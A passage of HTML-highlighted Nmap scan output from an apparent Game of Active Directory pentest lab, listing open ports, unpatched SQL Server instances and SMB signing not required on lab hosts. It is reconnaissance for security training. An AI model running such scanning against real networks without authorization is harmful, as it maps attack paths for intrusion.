<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Computer</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">DC03</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">DC03</span><span class="err">\</span><span class="nx">x00</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Forest</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">FQDN</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">DC03</span><span class="p">.</span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">System</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T10</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">27</span><span class="o">+</span><span class="mi">01</span><span class="p">:</span><span class="mi">00</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_nbstat</span><span class="p">:</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">DC03</span><span class="p">,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">user</span><span class="p">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">unknown</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">MAC</span><span class="p">:</span><span class="w"> </span><span class="nx">bc</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">2</span><span class="nx">f</span><span class="p">:</span><span class="mi">7</span><span class="nx">c</span><span class="p">:</span><span class="mi">2</span><span class="nx">c</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">27</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">33</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.22</span>
<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00022</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="w">    </span><span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">992</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="w">    </span><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="w">    </span><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">IIS</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">10.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Site</span><span class="w"> </span><span class="nx">doesn</span><span class="err">'</span><span class="nx">t</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="p">(</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">).</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="m m-Double">10.0</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">Potentially</span><span class="w"> </span><span class="nx">risky</span><span class="w"> </span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span><span class="nx">TRACE</span>
<span class="w">    </span><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="w">    </span><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="w">    </span><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
<span class="w">    </span><span class="mi">1433</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">s</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="m m-Double">15.00.2000.00</span><span class="p">;</span><span class="w"> </span><span class="nx">RTM</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">SSL_Self_Signed_Fallback</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">58</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2055</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">58</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="m m-Double">10.1.0.22</span><span class="p">:</span><span class="mi">1433</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">Target_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">NORTH</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">NetBIOS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">NORTH</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">NetBIOS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV02</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">DNS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">DNS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV02</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">DNS_Tree_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Product_Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">10.0.17763</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="m m-Double">10.1.0.22</span><span class="p">:</span><span class="mi">1433</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">Version</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="nx">RTM</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">number</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">15.00.2000.00</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">Product</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">Service</span><span class="w"> </span><span class="nx">pack</span><span class="w"> </span><span class="nx">level</span><span class="p">:</span><span class="w"> </span><span class="nx">RTM</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">Post</span><span class="o">-</span><span class="nx">SP</span><span class="w"> </span><span class="nx">patches</span><span class="w"> </span><span class="nx">applied</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">TCP</span><span class="w"> </span><span class="nx">port</span><span class="p">:</span><span class="w"> </span><span class="mi">1433</span>
<span class="w">    </span><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV02</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">26</span><span class="nx">T20</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">28</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">28</span><span class="nx">T20</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">28</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="mi">5986</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">http</span><span class="o">/</span><span class="m m-Double">1.1</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2019</span><span class="p">,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">vagrant</span><span class="o">-</span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2027</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="w">    </span><span class="nx">MAC</span><span class="w"> </span><span class="nx">Address</span><span class="p">:</span><span class="w"> </span><span class="nx">BC</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="nx">DF</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>

<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="nx">but</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">required</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">27</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_nbstat</span><span class="p">:</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV02</span><span class="p">,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">user</span><span class="p">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">unknown</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">MAC</span><span class="p">:</span><span class="w"> </span><span class="nx">bc</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="nx">df</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.23</span>
<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00024</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="w">    </span><span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">992</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="w">    </span><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="w">    </span><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">IIS</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">10.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="m m-Double">10.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">IIS</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">Potentially</span><span class="w"> </span><span class="nx">risky</span><span class="w"> </span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span><span class="nx">TRACE</span>
<span class="w">    </span><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="w">    </span><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="w">    </span><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="w">  </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nx">Standard</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="mi">14393</span><span class="w"> </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
<span class="w">    </span><span class="mi">1433</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">s</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="m m-Double">15.00.2000.00</span><span class="p">;</span><span class="w"> </span><span class="nx">RTM</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="m m-Double">10.1.0.23</span><span class="p">:</span><span class="mi">1433</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">Version</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="nx">RTM</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">number</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">15.00.2000.00</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">Product</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">Service</span><span class="w"> </span><span class="nx">pack</span><span class="w"> </span><span class="nx">level</span><span class="p">:</span><span class="w"> </span><span class="nx">RTM</span>
<span class="w">    </span><span class="o">|</span><span class="w">       </span><span class="nx">Post</span><span class="o">-</span><span class="nx">SP</span><span class="w"> </span><span class="nx">patches</span><span class="w"> </span><span class="nx">applied</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">TCP</span><span class="w"> </span><span class="nx">port</span><span class="p">:</span><span class="w"> </span><span class="mi">1433</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="m m-Double">10.1.0.23</span><span class="p">:</span><span class="mi">1433</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">Target_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">ESSOS</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">NetBIOS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">ESSOS</span>
